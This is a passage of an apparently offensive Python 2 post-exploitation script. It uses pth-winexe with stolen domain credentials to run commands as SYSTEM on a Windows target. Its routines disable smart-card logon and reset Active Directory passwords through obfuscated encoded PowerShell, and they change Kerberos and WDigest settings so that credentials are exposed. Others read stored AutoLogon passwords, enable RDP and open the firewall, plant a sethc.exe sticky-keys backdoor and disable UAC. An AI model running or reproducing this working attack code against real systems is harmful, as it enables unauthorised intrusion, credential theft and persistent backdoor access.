						os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
						print colored("[+]Task Completed for account - ",'green')+colored(response,'blue')		
				
				sys.exit()	

			elif edq_scforceoption=='d':
				print colored("\n[+]IMPORTANT - Leave SCforceoption in the state that you found it\n\n",'red')
								
				print colored("[+]Disabling SCforceoption:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]

				print colored("[+]Querying the status of SCforceoption:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]

				#Check to see if it's a DC
				scanv = subprocess.Popen(["nmap", "-sS", "-p88","--open", str(targets[0])], stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()[0]
				if "open" in scanv:
					print colored("[+]This looks to be a Domain Controller:",'green')
					response = raw_input("Would you like to turn off SmartCardLogonRequired AD Setting for an account : Y/(N) ")
					if response in yesanswers:	
						response = raw_input("Please enter the account name :")
						newpass = raw_input("Please enter a new password for the account :")
						print colored("[+]Turning off SmardCardLogonRequired for AD Account ",'green')+colored(response,'blue')	
						line="Import-Module ActiveDirectory\n"
						line=line+"Set-ADUser "+response+" -SmartcardLogonRequired $false\n"
						line=line+"Set-ADAccountPassword -Reset -NewPassword (ConvertTo-SecureString -AsPlainText \""+newpass+"\" -Force) -Identity "+response+"\n"

						en = b64encode(line.encode('UTF-16LE'))						
						os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
						print colored("[+]Task Completed for account - ",'green')+colored(response,'blue')	
						print colored("[+]Password for account ",'green')+colored(response,'blue')+colored(" has been changed to ",'green')+colored(newpass,'blue')

				sys.exit()	
	
			elif edq_scforceoption=='q':
				print colored("\n[+]INFO - Disabling this setting can be used to bypass Smart Card Logon\n\n",'red')
				print colored("[+]Querying the status of SCforceoption:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]
				
				sys.exit()	
		except OSError:
				print colored("[-]Something went wrong...",'red')
				sys.exit()	
	else:
		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
		sys.exit()

if edq_SingleSessionPerUser!='n':
	if len(targets)==1:
		try:
			if edq_SingleSessionPerUser=='e':
				print colored("\n[+]IMPORTANT - Leave SingleSessionPerUser in the state that you found it\n\n",'red')

				print colored("[+]Enabling SingleSessionPerUser:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fSingleSessionPerUser\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]

				print colored("[+]Querying the status of SingleSessionPerUser:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fSingleSessionPerUser\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]
				
				sys.exit()	

			elif edq_SingleSessionPerUser=='d':
				print colored("\n[+]IMPORTANT - Leave SingleSessionPerUser in the state that you found it\n\n",'red')
				
				print colored("[+]Disabling SingleSessionPerUser:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fSingleSessionPerUser\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]

				print colored("[+]Querying the status of SingleSessionPerUser:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fSingleSessionPerUser\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]

				sys.exit()	
	
			elif edq_SingleSessionPerUser=='q':
				print colored("[+]Querying the status of SingleSessionPerUser:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fSingleSessionPerUser\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]
				
				sys.exit()	
		except OSError:
				print colored("[-]Something went wrong...",'red')
				sys.exit()	
	else:
		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
		sys.exit()

if edq_allowtgtsessionkey!='n':
	if len(targets)==1:
		try:
			if edq_allowtgtsessionkey=='e':
				print colored("\n[+]IMPORTANT - Leave allowtgtsessionkey in the state that you found it\n\n",'red')

				print colored("[+]Enabling allowtgtsessionkey:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]

				print colored("[+]Querying the status of allowtgtsessionkey:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]
				
				sys.exit()	

			elif edq_allowtgtsessionkey=='d':
				print colored("\n[+]IMPORTANT - Leave allowtgtsessionkey in the state that you found it\n\n",'red')
				
				print colored("[+]Disabling allowtgtsessionkey:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]

				print colored("[+]Querying the status of allowtgtsessionkey:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]

				sys.exit()	
	
			elif edq_allowtgtsessionkey=='q':
				print colored("[+]Querying the status of allowtgtsessionkey:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]
				
				sys.exit()	
		except OSError:
				print colored("[-]Something went wrong...",'red')
				sys.exit()	
	else:
		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
		sys.exit()

if edq_autologon!='n':
	if len(targets)==1:
		try:
			if edq_autologon=='e':
				print colored("\n[+]IMPORTANT - Leave AutoLogon in the state that you found it\n\n",'red')

				print colored("[+]Enabling AutoLogon:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]

				print colored("[+]Querying the status of AutoLogon:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]
				
				sys.exit()	

			elif edq_autologon=='d':
				print colored("\n[+]IMPORTANT - Leave AutoLogon in the state that you found it\n\n",'red')
				
				print colored("[+]Disabling AutoLogon:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]

				print colored("[+]Querying the status of AutoLogon:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]

				sys.exit()	
	
			elif edq_autologon=='q':
				print colored("[+]Querying the status of AutoLogon:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"AutoAdminLogon\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]
				
				print colored("[+]Querying the status of Default Username:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"DefaultUserName\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]
				
				print colored("[+]Querying the status of Default Password:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"DefaultPassword\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]
				
				print colored("[+]Querying the status of Default Domain:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon\" /v \"DefaultDomainName\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]
				
				sys.exit()	
		except OSError:
				print colored("[-]Something went wrong...",'red')
				sys.exit()	
	else:
		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
		sys.exit()

if edq_wdigest!='n':
	if len(targets)==1:
		try:
			if edq_wdigest=='e':
				print colored("\n[+]IMPORTANT - Leave Wdigest in the state that you found it\n\n",'red')

				print colored("[+]Enabling Wdigest:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]
				
				print colored("[+]Querying the status of Wdigest:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]
				
				sys.exit()	

			elif edq_wdigest=='d':
				print colored("\n[+]IMPORTANT - Leave Wdigest in the state that you found it\n\n",'red')
				
				print colored("[+]Disabling Wdigest:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]
				
				print colored("[+]Querying the status of Wdigest:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]
				
				response = raw_input("[+]Do you wish to log a user off? Y/N (N): ")
				if response in yesanswers:	
					print colored("[+]Querying logged on users:",'green')
					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C quser\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
					print proc.communicate()[0]
					response = raw_input("[+]Enter the ID of the user you wish to log off: ")
					
					if response !="":
						print colored("[+]Attempting to log off user ID "+response,'green')
						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C logoff "+response+"\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
						print proc.communicate()[0]
						print colored("[+]Querying logged on users:",'green')
						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C quser\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
						print proc.communicate()[0]

				sys.exit()	
	
			elif edq_wdigest=='q':
				print colored("[+]Querying the status of Wdigest:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]
				
				sys.exit()	
		except OSError:
				print colored("[-]Something went wrong...",'red')
				sys.exit()	
	else:
		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
		sys.exit()

if edq_nla!='n':
	if len(targets)==1:
		try:
			if edq_nla=='e':
				print colored("\n[+]IMPORTANT - Leave NLA in the state that you found it\n\n",'red')

				print colored("[+]Enabling NLA:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\" /t REG_DWORD /f /D 1' 2>/dev/null")

				print colored("[+]Querying the status of NLA:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\"' 2>/dev/null")

				sys.exit()	

			elif edq_nla=='d':
				print colored("\n[+]IMPORTANT - Leave NLA in the state that you found it\n\n",'red')
				
				print colored("[+]Disabling NLA:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\" /t REG_DWORD /f /D 0' 2>/dev/null")

				print colored("[+]Querying the status of NLA:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\"' 2>/dev/null")

				sys.exit()	
	
			elif edq_nla=='q':
				print colored("[+]Querying the status of NLA:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\"' 2>/dev/null")

				sys.exit()	
		except OSError:
				print colored("[-]Something went wrong...",'red')
				sys.exit()	
	else:
		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
		sys.exit()

if edq_trdp!='n':
	if len(targets)==1:
		try:
			if edq_trdp=='e':
				print colored("\n[+]IMPORTANT - Leave RDP in the state that you found it\n\n",'red')

				print colored("[+]Setting RDP port to 443:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\" /t REG_DWORD /f /D 443' 2>/dev/null")

				print colored("[+]Restarting RDP Service:\n",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net stop \"termservice\" /y' 2>/dev/null")
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net start \"termservice\" /y' 2>/dev/null")

				print colored("[+]Querying the status of RDP Port:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\"' 2>/dev/null")

				sys.exit()	

			elif edq_trdp=='d':
				print colored("\n[+]IMPORTANT - Leave RDP in the state that you found it\n\n",'red')

				print colored("[+]Setting RDP to default port of 3389:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\" /t REG_DWORD /f /D 3389' 2>/dev/null")

				print colored("[+]Restarting RDP Service:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net stop \"termservice\" /y' 2>/dev/null")
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net start \"termservice\" /y' 2>/dev/null")

				print colored("[+]Querying the status of RDP Port:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\"' 2>/dev/null")

				sys.exit()	
	
			elif edq_trdp=='q':
				print colored("[+]Querying the status of RDP Port:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"PortNumber\"' 2>/dev/null")

				sys.exit()	
		except OSError:
				print colored("[-]Something went wrong...",'red')
				sys.exit()	
	else:
		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
		sys.exit()

if edq_rdp!='n':
	if len(targets)==1:
		try:
			if edq_rdp=='e':
				print colored("\n[+]IMPORTANT - Leave RDP in the state that you found it\n\n",'red')

				print colored("[+]Enabling RDP:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /f /D 0' 2>/dev/null")

				print colored("[+]Starting RDP Service:\n",'green')

				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net start \"termservice\"' 2>/dev/null")

				print colored("[+]Enabling Firewall Exception:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C netsh firewall set service type = remotedesktop mode = enable' 2>/dev/null")

				print colored("[+]Querying the status of RDP:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\"' 2>/dev/null")

				sys.exit()	

			elif edq_rdp=='d':
				print colored("\n[+]IMPORTANT - Leave RDP in the state that you found it\n\n",'red')

				print colored("[+]Disabling RDP:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /f /D 1' 2>/dev/null")

				print colored("[+]Stopping RDP Service:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C net stop \"termservice\" /y' 2>/dev/null")

				print colored("[+]Disabling Firewall Exception:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C netsh firewall set service type = remotedesktop mode = disable' 2>/dev/null")

				print colored("[+]Querying the status of RDP:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\"' 2>/dev/null")

				sys.exit()	
	
			elif edq_rdp=='q':
				print colored("[+]Querying the status of RDP:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyTSConnections\"' 2>/dev/null")

				sys.exit()	
		except OSError:
				print colored("[-]Something went wrong...",'red')
				sys.exit()	
	else:
		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
		sys.exit()

if edq_backdoor!='n':

	if len(targets)==1:
		try:
			if edq_backdoor=='e':
				print colored("\n[+]IMPORTANT - Remeber to remove when finished with\n\n",'red')

				print colored("[+]Enabling BACKDOOR:",'green')
				print colored("[+]To use press Left Shift + Left Alt + Print Screen at a Locked Workstation:",'yellow')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\" /v \"Debugger\" /t REG_SZ /d \"C:\windows\system32\cmd.exe\" /f' 2>/dev/null")
				
				sys.exit()	

			elif edq_backdoor=='d':
				print colored("\n[+]IMPORTANT - Remeber to remove when finished with\n\n",'red')

				print colored("[+]Disabling BACKDOOR:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\" /v \"Debugger\"  /t REG_SZ /d \"\" /f' 2>/dev/null")
				
				sys.exit()	
	
			elif edq_backdoor=='q':
				print colored("[+]Querying the status of Backdoor:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\" /v \"Debugger\"' 2>/dev/null")

				sys.exit()	
		except OSError:
				print colored("[-]Something went wrong...",'red')
				sys.exit()	
	else:
		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
		sys.exit()

if edq_uac!='n':
	
	if len(targets)==1:
		try:
			if edq_uac=='e':
				print colored("\n[+]IMPORTANT - Leave UAC in the state that you found it\n\n",'red')

				print colored("[+]Enabling UAC:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"EnableLUA\" /t REG_DWORD /f /D 1' 2>/dev/null")
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"ConsentPromptBehaviorAdmin\" /t REG_DWORD /f /D 1' 2>/dev/null")

				sys.exit()	

			elif edq_uac=='d':
				print colored("\n[+]IMPORTANT - Leave UAC in the state that you found it\n\n",'red')

				print colored("[+]Disabling UAC:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"EnableLUA\" /t REG_DWORD /f /D 0' 2>/dev/null")
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"ConsentPromptBehaviorAdmin\" /t REG_DWORD /f /D 0' 2>/dev/null")

				sys.exit()	
	
			elif edq_uac=='q':
				print colored("[+]Querying the status of UAC:",'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"EnableLUA\" ' 2>/dev/null")
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"ConsentPromptBehaviorAdmin\" ' 2>/dev/null")

				sys.exit()	
		except OSError:
				print colored("[-]Something went wrong...",'red')
				sys.exit()	
	else:
